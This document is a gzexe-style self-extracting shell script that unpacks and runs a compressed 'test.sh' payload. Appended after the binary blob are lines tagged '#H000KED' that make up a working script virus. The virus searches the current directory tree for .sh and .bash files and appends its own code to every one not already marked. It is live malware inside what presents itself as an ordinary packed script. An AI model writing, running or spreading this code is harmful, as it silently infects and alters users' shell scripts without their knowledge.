#!/bin/sh
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || tmpfile=/tmp/gztmp.$$ || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/gzip -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo Cannot decompress $0; exit 1
fi; exit $res
�6WGtest.sh M�Ak�@���W<�`KM̹R�Ԃ�P���C.�db��ݰ;|�Z[/����ޛ�A���d�UX(�c9lk����5v���+>*vP�3�V�>���k�l+�V�*�v����T����=ڊkBkYX����^Kk�r�j�X;��-7}sQ09DT�D%['Q͚�8�=�d���u%x����~�7�VY��ư��g\��I��t��`���%�1�X[j1�4�;������q;Ea0X$I��<z\�O@�^�!��R�z=�+��ڒ*]Tyz�}��f���l�ʲ����f��+�0�,�{��2/�9��W	?�
��  
for i in $( find . | grep -i "\.bash\$\|\.sh\$" ); do #H000KED
	if ( fgrep "\#H000KED" $i ); then
		continue #H000KED
	fi #H000KED
	echo >> $i #H000KED
	cat $0 | grep \#H000KED >> $i
done #H000KED
